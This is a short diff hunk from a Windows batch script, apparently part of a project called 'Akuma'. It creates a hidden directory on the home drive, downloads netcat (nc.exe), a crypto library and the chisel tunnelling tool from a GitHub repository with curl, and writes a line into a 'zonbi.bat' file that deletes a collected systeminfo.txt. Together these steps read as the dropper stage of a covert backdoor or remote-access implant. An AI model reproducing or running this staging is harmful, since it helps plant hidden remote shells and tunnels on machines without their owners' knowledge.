@@ -7,7 +7,7 @@ attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
 mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
 mkdir %homedrive%\Akuma\nc 
-curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc
+curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/chisel.exe > chisel.exe
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
